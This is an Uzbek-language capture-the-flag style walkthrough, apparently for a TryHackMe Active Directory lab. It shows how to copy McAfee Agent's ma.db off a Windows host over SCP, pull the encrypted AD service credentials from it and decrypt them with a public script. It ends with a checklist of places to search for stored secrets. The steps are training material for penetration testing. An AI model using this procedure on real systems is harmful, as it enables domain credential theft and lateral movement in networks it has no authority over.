

## 📍 1. Maqsad – `ma.db` faylidagi AD hisobini topish

**McAfee Endpoint Security** kabi korporativ ilovalar ko‘pincha tarmoqdagi boshqaruv tizimiga ulanish uchun **AD hisob ma’lumotlarini** saqlab qo‘yadi. Bu ma’lumotlar `ma.db` faylida shifrlangan holatda bo‘ladi.

---

## 🧭 2. `ma.db` faylini topish va yuklab olish

### 🔹 Fayl joylashuvi (Windows):

```
C:\ProgramData\McAfee\Agent\DB\ma.db
```

### 🔹 SSH orqali ulanish:

```bash
ssh thm@THMJMP1.za.tryhackme.com
```

### 🔹 Faylni o‘zingizning AttackBox ga SCP bilan ko‘chirish:

```bash
scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
```

---

## 🧪 3. Faylni ochish – `sqlitebrowser` orqali

```bash
sqlitebrowser ma.db
```

➡️ **Browse Data** → **AGENT\_REPOSITORIES** jadvalini tanlang

### ❗ E’tibor beriladigan maydonlar:

* `DOMAIN`
* `AUTH_USER`
* `AUTH_PASSWD` (shifrlangan parol)

---

## 🔓 4. Parolni deshifrlash – Python skripti orqali

Sizda shifrlangan `AUTH_PASSWD` bo‘lishi kerak. Endi uni quyidagi skript bilan deshifrlaysiz:

### 🔹 Python2 versiyasi:

```bash
python2 mcafee_sitelist_pwd_decrypt.py <AUTH_PASSWD>
```

**Agar Python2 ishlamasa**, quyidagilarni bajaring:

### 🔹 GitHub'dan Python3 versiyasini yuklab oling:

```bash
git clone https://github.com/funoverip/mcafee-sitelist-pwd-decryption
cd mcafee-sitelist-pwd-decryption
python3 mcafee_sitelist_pwd_decrypt.py <AUTH_PASSWD>
```

---

## 🧠 5. Amalga oshirilgan foyda

Siz:

* Mahalliy tizimdagi konfiguratsiya faylidan
* **AD domen foydalanuvchi nomi va shifrlangan parolini**
* Deshifrlash orqali **to‘liq AD hisobini** qo‘lga kiritdingiz

Bu hisob yordamida siz:

* **Lateral Movement** (tarmoq ichida boshqa tizimlarga o‘tish)
* **Privilege Escalation**
* **AD Enumeration** (Active Directory strukturasini tahlil qilish) kabi hujumlar bilan davom etishingiz mumkin.

---

## 🛡 Tavsiya: Enumeration Checklist

Agar siz tizimga kirishni uddalagan bo‘lsangiz, quyidagilarni tekshiring:

* `C:\ProgramData`, `C:\Program Files`, va foydalanuvchi papkalari (`AppData`)
* IIS, Tomcat, Apache, VPN, Jenkins, Gitlab config fayllari
* Registry kalitlari: `HKLM\SYSTEM`, `HKLM\SOFTWARE`
* `.env`, `.xml`, `.json`, `.ini`, `.conf` fayllar
* Seatbelt, WinPEAS, PowerView kabi avtomatlashtirilgan vositalar
